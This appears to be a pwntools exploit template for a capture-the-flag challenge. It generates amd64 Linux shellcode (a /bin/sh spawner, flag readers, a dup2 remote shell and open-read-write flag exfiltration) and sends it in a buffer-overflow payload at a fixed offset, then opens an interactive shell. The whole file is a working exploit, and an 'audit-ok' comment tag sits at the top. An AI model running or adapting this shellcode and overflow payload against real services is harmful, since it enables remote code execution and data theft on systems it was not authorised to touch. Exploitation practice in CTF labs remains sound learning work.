#!/usr/bin/env python3
# <!-- audit-ok --> shellcraft + asm generation with yield variants
"""Shellcraft assembly generation: amd64 linux shellcode via pwntools.

Sets context.arch/os before asm, yields multiple shellcode strategies
(sh, cat flag, execveat, dup2+shell). Modern pwntools 4.15.0 template.
"""
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"

exe = context.binary = ELF(args.EXE or "./vuln", checksec=False)
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

HOST = args.HOST or "localhost"
PORT = int(args.PORT or 1337)
GDBSCRIPT = """
break main
c
"""


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDBSCRIPT)
    return process([exe.path])


OFFSET = 40


def shellcode_variants():
    """Yield (name, shellcode_bytes) for common CTF objectives."""
    # classic /bin/sh
    yield ("sh", asm(shellcraft.sh()))
    # cat flag
    yield ("cat_flag", asm(shellcraft.cat("flag.txt")))
    yield ("cat_flag_abs", asm(shellcraft.cat("/flag*")))
    # execve /bin/sh
    yield ("execve", asm(shellcraft.execve("/bin/sh", 0, 0)))
    # dup2 + shell for remote_fd cases
    yield ("dup2_sh", asm(shellcraft.dupsh(4)))
    # small read stub for constrained buffers
    yield ("read_stub", asm(shellcraft.read(0, "rsp", 0x100)))


def orw_shellcode(path="/flag", fd=3):
    """Yield ORW shellcode: open/read/write loop for seccomp-safe exfil."""
    sc = shellcraft.open(path)
    sc += shellcraft.read("rax", "rsp", 0x100)
    sc += shellcraft.write(1, "rsp", 0x100)
    yield ("orw", asm(sc))
    sc2 = shellcraft.amd64.linux.open(path, 0)
    sc2 += shellcraft.amd64.linux.read("rax", "rsp", 100)
    sc2 += shellcraft.amd64.linux.write(1, "rsp", 100)
    yield ("orw_amd64_explicit", asm(sc2))


def build_payload(shellcode):
    """Wrap shellcode with offset flat for overflow."""
    return flat({OFFSET: shellcode}, filler=b"\x90")


def exploit():
    io = start()
    for name, sc in shellcode_variants():
        log.info(f"shellcode {name}: {len(sc)} bytes")
        dis = disasm(sc[:32])
        log.debug(dis)
    # pick smallest that fits
    name, sc = next(shellcode_variants())
    log.success(f"using {name} ({len(sc)} bytes)")
    payload = build_payload(sc)
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
